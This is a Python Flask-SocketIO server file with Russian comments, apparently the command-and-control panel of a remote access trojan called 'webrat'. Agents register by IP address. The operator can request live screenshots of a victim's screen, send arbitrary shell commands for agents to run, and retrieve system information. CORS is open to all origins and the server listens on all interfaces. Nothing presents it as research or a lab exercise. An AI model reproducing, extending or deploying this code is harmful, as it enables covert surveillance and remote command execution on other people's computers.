from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import eventlet
eventlet.monkey_patch()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_webrat'
socketio = SocketIO(app, cors_allowed_origins="*")

agents = {}
viewer_requests = {}  # {ip: sid_браузера}

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect_agent')
def handle_agent_connect(data):
    ip = data.get('ip')
    agents[ip] = request.sid
    emit('update_user_list', list(agents.keys()), broadcast=True)
    print(f"[+] Агент {ip} подключился")

@socketio.on('request_view')
def handle_view_request(data):
    target_ip = data.get('ip')
    browser_sid = request.sid
    if target_ip in agents:
        viewer_requests[target_ip] = browser_sid
        socketio.emit('request_screen', {'ip': target_ip}, room=agents[target_ip])

@socketio.on('screen_captured')
def handle_screen_data(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_screen', data, room=viewer_requests[target_ip])

@socketio.on('execute_command')
def handle_execute_command(data):
    target_ip = data.get('ip')
    command = data.get('command')
    if target_ip in agents:
        socketio.emit('run_shell_command', {'ip': target_ip, 'command': command}, room=agents[target_ip])
    else:
        emit('error_msg', f"Агент {target_ip} не в сети")

@socketio.on('command_result')
def handle_command_result(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_command_result', data, room=viewer_requests[target_ip])

@socketio.on('get_sysinfo')
def handle_get_sysinfo(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('request_sysinfo', {'ip': target_ip}, room=agents[target_ip])

@socketio.on('sysinfo_result')
def handle_sysinfo_result(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_sysinfo', data, room=viewer_requests[target_ip])

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)